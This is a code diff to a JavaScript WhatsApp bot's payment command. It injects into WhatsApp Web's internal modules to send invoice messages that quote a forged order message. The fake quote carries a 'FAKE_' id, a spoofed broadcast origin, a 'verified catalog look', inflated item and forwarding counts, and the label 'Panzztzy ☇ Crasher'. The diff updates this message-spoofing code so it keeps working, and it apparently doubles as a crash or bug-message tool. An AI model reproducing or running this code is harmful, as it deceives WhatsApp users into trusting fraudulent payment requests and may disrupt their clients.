@@ -396,39 +396,60 @@ async function handlePay(msg, args) {
 
     // 3. Send the invoice text quoting the verified catalog card in one single message!
     await client.pupPage.evaluate(async (chatId, title, invoiceText, base64) => {
-      const getStore = () => {
+      // Helper to dynamically wait until WWebJS modules are ready
+      const getModule = (name) => {
         return new Promise((resolve) => {
-          if (typeof window.Store !== 'undefined' && window.Store.Msg && window.Store.WidFactory && window.Store.Chat) {
-            resolve(window.Store);
-          } else {
-            const interval = setInterval(() => {
-              if (typeof window.Store !== 'undefined' && window.Store.Msg && window.Store.WidFactory && window.Store.Chat) {
-                clearInterval(interval);
-                resolve(window.Store);
-              }
-            }, 100);
-            setTimeout(() => {
-              clearInterval(interval);
-              resolve(null);
-            }, 8000);
+          if (typeof window.require !== 'undefined') {
+            try {
+              const mod = window.require(name);
+              if (mod) return resolve(mod);
+            } catch (e) {}
           }
+          const interval = setInterval(() => {
+            if (typeof window.require !== 'undefined') {
+              try {
+                const mod = window.require(name);
+                if (mod) {
+                  clearInterval(interval);
+                  resolve(mod);
+                }
+              } catch (e) {}
+            }
+          }, 100);
+          setTimeout(() => {
+            clearInterval(interval);
+            resolve(null);
+          }, 8000);
         });
       };
 
-      const Store = await getStore();
-      if (!Store) {
-        throw new Error('window.Store failed to load within timeout');
+      const WidFactory = await getModule('WAWebWidFactory');
+      const Collections = await getModule('WAWebCollections');
+      const MsgKey = await getModule('WAWebMsgKey');
+      const SendMsgChatAction = await getModule('WAWebSendMsgChatAction');
+      const UserPrefsMeUser = await getModule('WAWebUserPrefsMeUser');
+
+      if (!WidFactory || !Collections || !MsgKey || !SendMsgChatAction || !UserPrefsMeUser) {
+        throw new Error('Required WhatsApp Web modules failed to load within timeout');
       }
 
-      const chatWid = Store.WidFactory.createWid(chatId);
-      const chat = await Store.Chat.find(chatWid);
-      const newMsgId = await Store.MsgKey.newId();
+      const chatWid = WidFactory.createWid(chatId);
+      const chat = await Collections.Chat.find(chatWid);
+      const newId = await window.require('WAWebMsgKey').newId();
+      const from = UserPrefsMeUser.getMaybeMePnUser();
+
+      const newMsgKey = new MsgKey({
+        from: from,
+        to: chat.id,
+        id: newId,
+        selfDir: 'out',
+      });
 
       // Create fake quoted order message (verified catalog look)
-      const fakeQuotedData = {
+      const fakeQuoted = {
         id: {
           fromMe: false,
-          remote: Store.WidFactory.createWid('status@broadcast'),
+          remote: WidFactory.createWid('status@broadcast'),
           id: 'FAKE_' + Math.random().toString(36).substring(2, 15).toUpperCase(),
           _serialized: `false_status@broadcast_FAKE`
         },
@@ -438,34 +459,32 @@ async function handlePay(msg, args) {
         itemCount: '9999',
         status: 1, // INQUIRY
         surface: 'CATALOG',
-        sellerJid: Store.Conn.wid.toString(),
+        sellerJid: from.toString(),
         token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==',
         thumbnail: base64,
         caption: title,
-        participant: Store.WidFactory.createWid('0@s.whatsapp.net'),
+        participant: WidFactory.createWid('0@s.whatsapp.net'),
         isForwarded: true,
         forwardingScore: 999
       };
 
-      const fakeQuoted = Store.Msg.newMsg ? Store.Msg.newMsg(fakeQuotedData) : new Store.Msg(fakeQuotedData);
-
-      const msgData = {
-        id: newMsgId,
+      const message = {
+        id: newMsgKey,
         ack: 0,
-        from: Store.Conn.wid,
-        to: chatWid,
+        body: invoiceText,
+        from: from,
+        to: chat.id,
         local: true,
         self: 'out',
-        t: parseInt(Date.now() / 1000),
+        t: parseInt(new Date().getTime() / 1000),
+        isNewMsg: true,
         type: 'chat',
-        body: invoiceText,
         quotedMsg: fakeQuoted,
         quotedStanzaID: fakeQuoted.id.id,
         quotedParticipant: fakeQuoted.participant
       };
 
-      const msg = Store.Msg.newMsg ? Store.Msg.newMsg(msgData) : new Store.Msg(msgData);
-      await Store.addAndSendMsgToChat(chat, msg);
+      await SendMsgChatAction.addAndSendMsgToChat(chat, message);
     }, chatId, "Panzztzy ☇ Crasher", invoiceText, base64Thumb);
 
     console.log(`💳 Invoice sent: ${orderId} | ${formatIDR(nominal)} | ${deskripsi} | Chat: ${chatId}`);
